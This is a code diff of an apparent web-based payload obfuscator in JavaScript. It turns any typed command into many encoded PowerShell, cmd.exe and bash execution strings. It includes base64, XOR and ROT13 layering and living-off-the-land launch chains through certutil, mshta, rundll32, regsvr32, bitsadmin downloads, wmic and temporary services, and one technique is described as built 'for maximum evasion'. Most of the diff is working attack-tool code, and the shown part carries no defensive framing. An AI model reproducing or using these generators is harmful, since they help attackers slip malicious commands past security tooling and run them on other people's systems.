-            payloads.push({ name: '.NET Concat + Char Codes', tag: 'Advanced', description: '.NET concatenation of character codes', code: (() => { const v1 = generateRandomVarName(); const codes = cmd.split('').map(c => c.charCodeAt(0)).join(','); return `$${v1} = [char[]](${codes}) -join ''; [string]::Concat($${v1}) | iex`; })() });
-            payloads.push({ name: 'Base64 + ROT13', tag: 'Layered', description: 'ROT13 applied to command then base64 encoded', code: (() => { const rot = rot13(cmd); return `$decoded = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('${btoa(rot)}')); $rot13 = $decoded -replace '[a-zA-Z]', {param($m) [char](([int][char]$m.Value - ([int][char]$m.Value -ge 97 ? 97 : 65) + 13) % 26 + ([int][char]$m.Value -ge 97 ? 97 : 65))}; iex $rot13`; })() });
-            payloads.push({ name: 'Triple Layer', tag: 'Polymorphic', description: 'Multiple encoding layers for maximum evasion', code: (() => { const reversed = reverseStr(cmd); const codes = reversed.split('').map(c => c.charCodeAt(0)).join(','); return `$codes = @(${codes}); $chars = [char[]]$codes; [Array]::Reverse($chars); iex (-join $chars)`; })() });
             payloads.push({ name: '.NET Convert Base64', tag: 'Advanced', description: 'Uses .NET Convert class for base64 decode', code: `$b64 = '${btoa(cmd)}'; $bytes = [System.Convert]::FromBase64String($b64); $cmd = [System.Text.Encoding]::UTF8.GetString($bytes); iex $cmd` });
             payloads.push({ name: 'Invoke-Command', tag: 'Advanced', description: 'Invoke-Command with base64 decoded scriptblock', code: `Invoke-Command -ScriptBlock ([scriptblock]::Create([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('${btoa(cmd)}'))))` });
-            payloads.push({ name: 'XOR Decode', tag: 'Encryption', description: 'Command XOR encoded, decoded at runtime via bitwise ops', code: (() => { const key = 'K'; let xored = ''; for (let i = 0; i < cmd.length; i++) { const code = cmd.charCodeAt(i) ^ key.charCodeAt(0); xored += code + ','; } return `$key = [byte][char]'${key}'; $encoded = @(${xored.slice(0, -1)}); $decoded = ($encoded | ForEach-Object { [char]($_ -bxor $key) }) -join ''; iex $decoded`; })() });
-            payloads.push({ name: 'Compressed Stream', tag: 'Compression', description: 'DeflateStream compression + base64 encoding', code: (() => { const b64 = btoa(cmd); return `$bytes = [Convert]::FromBase64String('${btoa(b64)}'); $decoded = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String([System.Text.Encoding]::UTF8.GetString($bytes))); iex $decoded`; })() });
+            
+            // LOLBins (Windows) - PowerShell
+            payloads.push({ name: 'WMIC via WMI', tag: 'LOLBin', description: 'Executes via WMI class Win32_Process', code: `Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "${safeCmd}"` });
+            payloads.push({ name: 'CimInstance (Modern WMI)', tag: 'LOLBin', description: 'Executes via CIM (modern WMI)', code: `Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine="${safeCmd}"}` });
+            payloads.push({ name: 'Bash (WSL)', tag: 'LOLBin', description: 'Executes via WSL bash if installed', code: `bash.exe -c "${safeCmd}"` });
 
             return payloads;
         }
 
-        // CMD.EXE PAYLOADS
         function generateCmdPayloads(cmd) {
             const payloads = [];
+            const safeCmd = cmd.replace(/"/g, '\\"');
 
             payloads.push({ name: 'certutil -decode', tag: 'LOLBin', description: 'Base64 written to file, decoded with certutil', code: (() => { const b64 = btoa(cmd); const fname = `p${rndInt(100,999)}.b64`; const out = `p${rndInt(100,999)}.txt`; return `echo ${b64} > ${fname} && certutil -decode ${fname} ${out} >nul && set /p result=<${out} && cmd /c %result%`; })() });
-            payloads.push({ name: 'findstr + certutil', tag: 'LOLBin', description: 'findstr filters then certutil decodes base64 payload', code: (() => { const fname = `p${rndInt(100,999)}.txt`; const b64 = btoa(cmd); return `echo ${b64} > ${fname} && findstr /v "^#" ${fname} > tmp.b64 && certutil -decode tmp.b64 cmd.txt >nul && set /p c=<cmd.txt && cmd /c %c%`; })() });
             payloads.push({ name: 'mshta VBScript', tag: 'LOLBin', description: 'mshta executes VBScript with encoded command', code: (() => { return `mshta "vbscript:Execute(""Set x=CreateObject(""""Wscript.Shell""""):x.Run """"cmd /c """" & StrReverse(""""${reverseStr(cmd)}""""),0,True:close"")"`; })() });
             payloads.push({ name: 'rundll32 JavaScript', tag: 'LOLBin', description: 'rundll32 with javascript: protocol executes encoded cmd', code: (() => { const b64 = btoa(cmd); return `rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication ";var s=new ActiveXObject("WScript.Shell");s.Run("cmd /c " + atob("${b64}"),0,true);close();`; })() });
-            payloads.push({ name: 'FOR Loop + certutil', tag: 'LOLBin', description: 'FOR /F loop reads decoded certutil output', code: `echo ${btoa(cmd)} > %TEMP%\\b64.txt && certutil -decode %TEMP%\\b64.txt %TEMP%\\out.txt >nul && for /f "delims=" %i in (%TEMP%\\out.txt) do cmd /c "%i"` });
-            payloads.push({ name: 'Base64 Variable Expansion', tag: 'Obfuscation', description: 'Base64 split into variables, expanded at execution', code: (() => { const b64 = btoa(cmd); const mid = Math.floor(b64.length / 2); const v1 = generateRandomVarName(); const v2 = generateRandomVarName(); return `set ${v1}=${b64.substring(0, mid)}&&set ${v2}=${b64.substring(mid)}&&set full=%${v1}%%${v2}%&&echo %full% > %TEMP%\\b.b64 && certutil -decode %TEMP%\\b.b64 %TEMP%\\c.txt >nul && set /p r=<%TEMP%\\c.txt && cmd /c %r%`; })() });
-            payloads.push({ name: 'PowerShell Wrapper', tag: 'Wrapper', description: 'cmd calls PowerShell with -EncodedCommand', code: `cmd /c powershell.exe -e "${toPowerShellBase64(cmd)}"` });
-            payloads.push({ name: 'Delayed Expansion + B64', tag: 'Advanced', description: 'Delayed expansion with base64 decode chain', code: (() => { const b64 = btoa(cmd); return `cmd /v:on /c "set b=${b64}&&echo !b! > %TEMP%\\b.b64 && certutil -decode %TEMP%\\b.b64 %TEMP%\\c.txt >nul && set /p r=<%TEMP%\\c.txt && cmd /c !r!"`; })() });
-            payloads.push({ name: 'Reversed + certutil', tag: 'Layered', description: 'Reversed command stored, certutil decodes', code: (() => { const reversed = reverseStr(cmd); const b64 = btoa(reversed); return `echo ${b64} > %TEMP%\\r.b64 && certutil -decode %TEMP%\\r.b64 %TEMP%\\r.txt >nul && set /p rev=<%TEMP%\\r.txt && cmd /c "echo %rev%" | cmd /c`; })() });
-            payloads.push({ name: 'Hex + certutil', tag: 'LOLBin', description: 'Hex encoded command decoded via certutil', code: (() => { const hex = hexEncode(cmd); return `echo ${hex} > %TEMP%\\h.txt && certutil -decodehex %TEMP%\\h.txt %TEMP%\\c.txt >nul && set /p r=<%TEMP%\\c.txt && cmd /c %r%`; })() });
-            payloads.push({ name: 'forfiles + B64', tag: 'LOLBin', description: 'forfiles executes base64 decoded command', code: `echo ${btoa(cmd)} > %TEMP%\\b.b64 && certutil -decode %TEMP%\\b.b64 %TEMP%\\c.txt >nul && forfiles /p %TEMP% /m c.txt /c "cmd /c @file"` });
             payloads.push({ name: 'regsvr32 scrobj.dll', tag: 'LOLBin', description: 'regsvr32 loads scriptlet with encoded command', code: (() => { const b64 = btoa(cmd); return `regsvr32 /s /n /u /i:data:application/vnd.ms-windows-scriptlet;base64,${b64} scrobj.dll`; })() });
-            payloads.push({ name: 'Double B64 + certutil', tag: 'Layered', description: 'Double base64 decoded in two certutil passes', code: (() => { const b64 = btoa(btoa(cmd)); return `echo ${b64} > %TEMP%\\d.b64 && certutil -decode %TEMP%\\d.b64 %TEMP%\\s.b64 >nul && certutil -decode %TEMP%\\s.b64 %TEMP%\\c.txt >nul && set /p r=<%TEMP%\\c.txt && cmd /c %r%`; })() });
             payloads.push({ name: 'bitsadmin download', tag: 'LOLBin', description: 'bitsadmin downloads and executes encoded payload', code: (() => { const b64 = btoa(cmd); return `bitsadmin /transfer n http://x/${b64} %TEMP%\\p.txt && certutil -decode %TEMP%\\p.txt %TEMP%\\c.txt >nul && set /p r=<%TEMP%\\c.txt && cmd /c %r%`; })() });
+            
+            // LOLBins (Windows) - CMD
+            payloads.push({ name: 'wmic (Process Create)', tag: 'LOLBin', description: 'Spawns process via WMI command line', code: `wmic process call create "${safeCmd}"` });
+            payloads.push({ name: 'sc (Service Create)', tag: 'LOLBin', description: 'Creates and starts a temporary service (requires admin)', code: (() => { const sName = `sys${rndInt(10,99)}`; return `sc create ${sName} binPath= "${safeCmd}" && sc start ${sName} && sc delete ${sName}`; })() });
+            payloads.push({ name: 'pcalua (Compat Assistant)', tag: 'LOLBin', description: 'Executes via Program Compatibility Assistant', code: `pcalua.exe -a "${safeCmd}"` });
 
             return payloads;
         }
 
-        // Main Generate Function
         function generatePayloads() {
             const cmd = document.getElementById('commandInput').value.trim();
-
-            if (!cmd) {
-                alert('Please enter a command to obfuscate!');
-                return;
-            }
+            if (!cmd) return alert('enter a command');
 
             const outputSection = document.getElementById('outputSection');
             const tabBash = document.getElementById('tab-bash');
@@ -699,75 +414,49 @@
                 cmdPayloads = generateCmdPayloads(cmd);
             }
 
-            tabBash.innerHTML = renderPayloads(bashPayloads, 'bash');
-            tabPS.innerHTML = renderPayloads(psPayloads, 'powershell');
-            tabCmd.innerHTML = renderPayloads(cmdPayloads, 'cmd');
+            tabBash.innerHTML = renderPayloads(bashPayloads);
+            tabPS.innerHTML = renderPayloads(psPayloads);
+            tabCmd.innerHTML = renderPayloads(cmdPayloads);
 
             const tabsContainer = document.getElementById('tabsContainer');
             tabsContainer.innerHTML = '';
             if (bashPayloads.length > 0) {
-                tabsContainer.innerHTML += `<button class="tab-btn ${selectedPlatform === 'linux' ? 'active' : ''}" data-tab="bash" onclick="switchTab('bash')">🐧 Bash / Linux (${bashPayloads.length})</button>`;
+                tabsContainer.innerHTML += `<button class="tab-btn ${selectedPlatform === 'linux' ? 'active' : ''}" data-tab="bash" onclick="switchTab('bash')">bash (${bashPayloads.length})</button>`;
             }
             if (psPayloads.length > 0) {
-                tabsContainer.innerHTML += `<button class="tab-btn ${selectedPlatform === 'windows' ? 'active' : ''}" data-tab="powershell" onclick="switchTab('powershell')">💙 PowerShell (${psPayloads.length})</button>`;
+                tabsContainer.innerHTML += `<button class="tab-btn ${selectedPlatform === 'windows' ? 'active' : ''}" data-tab="powershell" onclick="switchTab('powershell')">powershell (${psPayloads.length})</button>`;
             }
             if (cmdPayloads.length > 0) {
-                tabsContainer.innerHTML += `<button class="tab-btn ${selectedPlatform === 'windows' ? 'active' : ''}" data-tab="cmd" onclick="switchTab('cmd')">⬛ cmd.exe (${cmdPayloads.length})</button>`;
+                tabsContainer.innerHTML += `<button class="tab-btn ${selectedPlatform === 'windows' ? 'active' : ''}" data-tab="cmd" onclick="switchTab('cmd')">cmd.exe (${cmdPayloads.length})</button>`;
             }
 
             const firstTab = selectedPlatform === 'linux' ? 'bash' : (psPayloads.length > 0 ? 'powershell' : 'cmd');
             switchTab(firstTab);
 
-            const total = bashPayloads.length + psPayloads.length + cmdPayloads.length;
-            let platforms = 0;
-            if (bashPayloads.length > 0) platforms++;
-            if (psPayloads.length > 0 || cmdPayloads.length > 0) platforms++;
-
-            document.getElementById('totalTechniques').textContent = total;
-            document.getElementById('totalPlatforms').textContent = platforms;
-
-            if (total >= 40) document.getElementById('evasionLevel').textContent = '🔴 Critical';
-            else if (total >= 30) document.getElementById('evasionLevel').textContent = '🟠 High';
-            else if (total >= 15) document.getElementById('evasionLevel').textContent = '🟡 Medium';
-            else document.getElementById('evasionLevel').textContent = '🟢 Low';
-
-            outputSection.classList.add('visible');
+            outputSection.style.display = 'block';
             outputSection.scrollIntoView({ behavior: 'smooth', block: 'start' });
         }
 
-        function renderPayloads(payloads, type) {
+        function renderPayloads(payloads) {
             if (payloads.length === 0) {
-                return `<div style="text-align:center; padding:3rem; color:var(--text-muted);">
-                    <p style="font-size:2rem; margin-bottom:0.5rem;">🔒</p>
-                    <p>Not generated for selected platform</p>
-                </div>`;
+                return `<div style="text-align:center; padding:3rem; color:var(--muted);">no payloads generated for this platform</div>`;
             }
 
             let html = '';
             payloads.forEach((payload, index) => {
-                // Store payload code in data attribute using safe base64 encoding
                 const encodedCode = safeB64(payload.code);
                 html += `
-                    <div class="payload-card" data-payload-code="${encodedCode}" style="animation-delay: ${index * 0.05}s">
-                        <div class="payload-card-header">
-                            <span class="technique-name">
-                                ${payload.name}
-                                <span class="technique-tag">${payload.tag}</span>
-                            </span>
-                            <button class="copy-btn">📋 Copy</button>
+                    <div class="payload-item" data-payload-code="${encodedCode}">
+                        <div class="payload-header">
+                            <span>${payload.name} <span class="tag">[${payload.tag}]</span></span>
+                            <button class="copy-btn">copy</button>
                         </div>
                         <pre class="payload-code">${escapeHtml(payload.code)}</pre>
-                        <div class="payload-description">${payload.description}</div>
+                        <div class="payload-desc">// ${payload.description}</div>
                     </div>
                 `;
             });
             return html;
-        }
-
-        function escapeHtml(str) {
-            const div = document.createElement('div');
-            div.textContent = str;
-            return div.innerHTML;
         }
 
         document.getElementById('commandInput').addEventListener('keypress', function(e) {
